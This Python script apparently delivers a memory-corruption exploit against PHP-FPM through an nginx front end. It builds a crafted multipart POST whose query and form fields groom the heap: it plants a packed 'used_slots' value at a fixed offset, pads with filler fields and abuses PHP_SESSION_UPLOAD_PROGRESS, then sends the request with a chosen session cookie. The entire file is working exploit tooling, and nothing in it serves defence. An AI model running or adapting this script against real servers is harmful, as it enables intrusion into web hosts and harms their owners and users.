#!/usr/bin/env python3
"""Deliver the fcgi_split multipart request over HTTP to an nginx front end
instead of raw FastCGI to php-fpm. Body/query construction is copied verbatim
from fcgi_split.py so the bytes fpm sees are identical; only the transport
differs (nginx -> fastcgi_pass -> fpm, vs socket straight to fpm).

usage: http_deliver.py <baseurl> <sid> [preamble_hex] [padlen] [qpad] [nvars]
                       [vlen] [n2p] [script] [respfile] [biglen] [nfill]
                       [filllen] [fillfile]

<baseurl> e.g. http://127.0.0.1:9005 ; <script> path like /var/www/html/echo.php
(only its basename is used for the URL path). Env: PROG, USED_SLOTS, NO_PROGRESS,
BODY_FILE, QS_IN_BODY (move the n2p groom vars into the POST body as urlencoded
form fields instead of the query string).
"""
import os
import struct
import sys
import urllib.request

base = sys.argv[1].rstrip("/")
sid = sys.argv[2]
pre = bytes.fromhex(sys.argv[3]) if len(sys.argv) > 3 else b"\xfe\xff\xff\xff\xff\xff\xff\xff"
padlen = int(sys.argv[4]) if len(sys.argv) > 4 else 0
qpad = int(sys.argv[5]) if len(sys.argv) > 5 else 0
nvars = int(sys.argv[6]) if len(sys.argv) > 6 else 0
vlen = int(sys.argv[7]) if len(sys.argv) > 7 else 0
n2p = int(sys.argv[8]) if len(sys.argv) > 8 else 0
prog = int(os.environ.get("PROG", "1"))
script = sys.argv[9] if len(sys.argv) > 9 else "/var/www/html/index.php"
respfile = sys.argv[10] if len(sys.argv) > 10 else ""
biglen = int(sys.argv[11]) if len(sys.argv) > 11 else 0
nfill = int(sys.argv[12]) if len(sys.argv) > 12 else 0
filllen = int(sys.argv[13]) if len(sys.argv) > 13 else 8170
fillfile = sys.argv[14] if len(sys.argv) > 14 else ""
assert len(pre) == 8, "preamble must be 8 bytes"

qs_in_body = os.environ.get("QS_IN_BODY") == "1"

boundary = b"----p2s"
body = pre + b"\r\n"
if nfill:
    if fillfile:
        fv = open(fillfile, "rb").read()[:filllen].ljust(filllen, b"\0")
    else:
        fv = b"A" * filllen
    for i in range(nfill):
        body += b"--" + boundary + b"\r\n"
        body += b'Content-Disposition: form-data; name="f%d"' % i
        body += b"\r\n\r\n" + fv + b"\r\n"
if biglen:
    bmark = bytes.fromhex("0011223344556677")
    body += b"--" + boundary + b"\r\n"
    body += b'Content-Disposition: form-data; name="big"\r\n\r\n'
    body += bmark + b"B" * max(0, biglen - len(bmark)) + b"\r\n"

# ---- query string (identical encoding to fcgi_split.py) ----
qs = b""
used_slots = int(os.environ.get("USED_SLOTS", "-256"))
if qpad or nvars or n2p:
    if qpad:
        mark = bytes.fromhex("0011223344556677")
        enc = b"".join(b"%%%02X" % b for b in mark)
        qs = b"q=" + enc + b"A" * max(0, qpad - len(mark))
    for i in range(nvars):
        qs += b"&a%d=v" % i
    for i in range(n2p):
        val = bytearray(b"Q" * vlen)
        if vlen > 0xFE8 + 8:
            val[0xFE8:0xFE8 + 8] = struct.pack("<q", used_slots)
        enc = b"".join((bytes([c]) if (0x20 <= c < 0x7f and c not in b"&=%+;#") else b"%%%02X" % c) for c in val)
        qs += b"&v%d=" % i + enc
    qs = qs[1:] if qs.startswith(b"&") else qs

# optionally relocate the n2p groom vars from the query string into the POST
# body as urlencoded form fields (application/x-www-form-urlencoded style field
# inside multipart), so the request line stays under nginx's header limit.
if qs_in_body and n2p:
    # rebuild qs WITHOUT the n2p vars; emit those vars as multipart form fields.
    qs = b""
    if qpad:
        mark = bytes.fromhex("0011223344556677")
        enc = b"".join(b"%%%02X" % b for b in mark)
        qs = b"q=" + enc + b"A" * max(0, qpad - len(mark))
    for i in range(nvars):
        qs += b"&a%d=v" % i
    qs = qs[1:] if qs.startswith(b"&") else qs
    for i in range(n2p):
        val = bytearray(b"Q" * vlen)
        if vlen > 0xFE8 + 8:
            val[0xFE8:0xFE8 + 8] = struct.pack("<q", used_slots)
        body += b"--" + boundary + b"\r\n"
        body += b'Content-Disposition: form-data; name="v%d"' % i
        body += b"\r\n\r\n" + bytes(val) + b"\r\n"

if os.environ.get("NO_PROGRESS") != "1":
    body += b"--" + boundary + b"\r\n"
    body += (b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
             b"\r\n\r\n" + b"x" * prog + b"\r\n")
    body += b"--" + boundary + b"\r\n"
    body += b'Content-Disposition: form-data; name="f"; filename="x"\r\n'
    body += b"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
body += b"--" + boundary + b"--\r\n"
if os.environ.get("BODY_FILE"):
    body = open(os.environ["BODY_FILE"], "rb").read()

path = "/" + os.path.basename(script)
url = base + path
if qs:
    url += "?" + qs.decode("latin-1")

req = urllib.request.Request(
    url,
    data=body,
    method="POST",
    headers={
        "Content-Type": "multipart/form-data; boundary=" + boundary.decode(),
        "Cookie": "PHPSESSID=" + sid,
        "Connection": "close",
    },
)
sys.stderr.write("HTTP %s urllen=%d bodylen=%d\n" % (path, len(url), len(body)))
try:
    with urllib.request.urlopen(req, timeout=30) as r:
        code = r.status
        payload = r.read()
except urllib.error.HTTPError as e:
    code = e.code
    payload = e.read()
print("http_status=%d" % code)
print("resp_body=%d" % len(payload))
if respfile:
    open(respfile, "wb").write(payload)
